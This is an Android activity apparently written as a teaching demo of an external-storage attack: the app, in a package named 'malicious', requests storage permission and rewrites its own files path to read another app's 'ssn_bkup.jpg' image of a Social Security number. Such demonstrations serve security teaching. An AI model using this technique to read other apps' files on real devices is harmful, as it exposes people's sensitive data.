package santos.cs.ksu.edu.malicious;

import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.ImageView;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MalActivity extends AppCompatActivity {

    private static final String TAG = "ExternalStorageMal";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
        if (checkPermission("android.permission.READ_EXTERNAL_STORAGE", android.os.Process.myPid(), android.os.Process.myUid()) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "android.permission.READ_EXTERNAL_STORAGE already granted");
        } else {
            Log.d(TAG, "need android.permission.READ_EXTERNAL_STORAGE permission");
            try{
                ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE"}, 100);
            }
            catch(Exception e){
                e.printStackTrace();
            }

        }
    }

    @Override
    protected void onResume(){
        super.onResume();
        ImageView imageView = (ImageView) findViewById(R.id.imageView);
        //File file = new File("/storage/emulated/0/Android/data/santos.cs.ksu.edu.benign/files/ssn_bkup.jpg");
        File file = new File(getExternalFilesDir(null),"ssn_bkup.jpg");
        String absPath = file.getAbsolutePath();
        String path = absPath.replace("santos.cs.ksu.edu.malicious","santos.cs.ksu.edu.benign");
        Log.d(TAG,file.getAbsolutePath());
        try{
            Bitmap image = BitmapFactory.decodeFile(path);
            imageView.setImageBitmap(image);
        }
        catch(Exception e){
            Log.d(TAG, "Error while writing " + path);
            e.printStackTrace();
        }
    }
}
